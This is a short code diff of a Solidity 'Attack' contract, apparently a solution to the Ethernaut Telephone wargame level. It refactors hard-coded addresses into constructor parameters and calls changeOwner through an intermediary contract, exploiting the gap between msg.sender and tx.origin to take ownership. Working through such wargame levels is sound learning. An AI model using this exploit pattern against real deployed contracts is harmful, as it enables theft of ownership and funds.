@@ -7,11 +7,16 @@ interface ITelephone {
 
 contract Attack {
 
-    address level_addr = "Instance address";
-    address my_account = "The account you connect to Ethernaut";
+    address target;
+    address myAccount;
+
+    constructor(address taregtAddr, address accountAddr) {
+        target = taregtAddr;
+        myAccount = accountAddr;
+    }
     
     // use this contract to call our target contract, so `msg.sender` will be the former and `tx.origon` will be our wallet account.
     function callChangeOwner() external { 
-        ITelephone(level_addr).changeOwner(my_account);
+        ITelephone(target).changeOwner(myAccount);
     }
 }
